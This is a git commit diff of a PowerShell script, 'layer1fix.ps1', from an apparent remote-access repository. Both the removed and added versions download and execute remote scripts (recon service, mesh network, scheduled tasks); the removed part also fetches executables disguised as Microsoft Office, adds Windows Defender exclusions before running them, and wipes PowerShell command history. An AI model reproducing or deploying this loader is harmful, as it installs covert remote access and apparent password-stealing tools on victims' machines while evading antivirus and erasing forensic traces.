3a3d28c3b39a94a1d5411cb6265c8960e3911eb8
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-21 20:42:39 +0500

    Update layer1fix.ps1

--- layer1fix.ps1
+++ layer1fix.ps1
@@ -1,121 +1,49 @@
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-$sanit = Read-Host "Sanitization (y/n)"
-if ([string]::IsNullOrEmpty($sanit)) {
-    Start-Sleep -Seconds 1
-    $sanit = "y"
-}
-if ($sanit.ToLower() -eq "y") {
-$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
-if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
-    $files = Get-ChildItem -Path $psreadlineFolderPath
-    if ($files.Count -gt 0) {
-        Remove-Item -Path "$psreadlineFolderPath\*" -Force
+function Show-ActionMenu {
+    param (
+        [array] $Actions
+    )
+    Write-Host "Choose an action to execute or type 'q' to quit:" -ForegroundColor Yellow
+    $index = 1
+    foreach ($actionUrl in $Actions) {
+        $fileName = [System.IO.Path]::GetFileName($actionUrl)
+        Write-Host "$index. $fileName"
+        $index++
+    }
+    $selectedActionIndex = Read-Host "Enter the number of the action you want to execute or type 'q' to quit"
+
+    if ($selectedActionIndex -eq 'q') {
+        Write-Host "Exiting..."
+        # Add code to clear PSReadLine history
+        $psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
+        if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
+            $files = Get-ChildItem -Path $psreadlineFolderPath
+            if ($files.Count -gt 0) {
+                Remove-Item -Path "$psreadlineFolderPath\*" -Force
+            }
+        }
+        return
+    }
+    if ($selectedActionIndex -ge 1 -and $selectedActionIndex -le $Actions.Count) {
+        $selectedUrl = $Actions[$selectedActionIndex - 1]
+        $selectedAction = [System.IO.Path]::GetFileNameWithoutExtension($selectedUrl)
+        Write-Host "You chose: $selectedAction"  -ForegroundColor Green
+        
+        $urlContent = (Invoke-WebRequest -Uri $selectedUrl -UseBasicParsing).Content
+        Invoke-Expression $urlContent
+    } else {
+        Write-Host "Invalid selection. Please choose a valid number or type 'q' to quit."
     }
 }
-} else {}
-#OP Install
-$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$prompt = Read-Host "Proceed With OP Install (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($prompt.ToLower() -eq "y") {
-    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-} else {}
-#ZT Setup
-$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$prompt = Read-Host "Proceed With $Name Install (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($prompt.ToLower() -eq "y") {
-    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-} else {}
-#Recon Service
-$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$prompt = Read-Host "Proceed With $Name Install (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($prompt.ToLower() -eq "y") {
-    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-} else {}
-$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$prompt = Read-Host "Proceed With $Name Install (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($prompt.ToLower() -eq "y") {
-    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-} else {}
-#Scheduled Task
-$url = "https://tinyurl.com/taskschedulersetup"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$prompt = Read-Host "Proceed With $Name Install (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($prompt.ToLower() -eq "y") {
-    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-} else {}
-#litepwdsnitch Fix
-$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($pwdst.ToLower() -eq "y") {
-    Write-Host "Executing $Name Fix..."
-    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
-    	Add-MpPreference -ExclusionPath $exepath
-	Invoke-WebRequest -Uri $url -OutFile $exepath	
-	Start-Process -FilePath $exepath
- 	if ($output -ne $null) {
-    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
-	} else {}
-	Remove-MpPreference -ExclusionPath $exepath
-} else {}
-#classic-full-st Fix
-$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeFull.exe"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($pwdst.ToLower() -eq "y") {
-    Write-Host "Executing $Name Fix..."
-    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
-    	Add-MpPreference -ExclusionPath $exepath
-	Invoke-WebRequest -Uri $url -OutFile $exepath	
-	Start-Process -FilePath $exepath
- 	if ($output -ne $null) {
-    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
-	} else {}
-	Remove-MpPreference -ExclusionPath $exepath
-} else {}
-$sanit = Read-Host "Sanitization (y/n)"
-if ([string]::IsNullOrEmpty($sanit)) {
-    Start-Sleep -Seconds 1
-    $sanit = "y"
-}
-if ($sanit.ToLower() -eq "y") {
-$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
-if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
-    $files = Get-ChildItem -Path $psreadlineFolderPath
-    if ($files.Count -gt 0) {
-        Remove-Item -Path "$psreadlineFolderPath\*" -Force
-    }
-}
-} else {}
+# Define an array of action URLs
+$actions = @(
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1",
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1",
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1",
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1",
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Executeables.ps1",
+	"https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1"
+)
+# Call the function to display the action menu and execute the selected action or quit
+Show-ActionMenu -Actions $actions
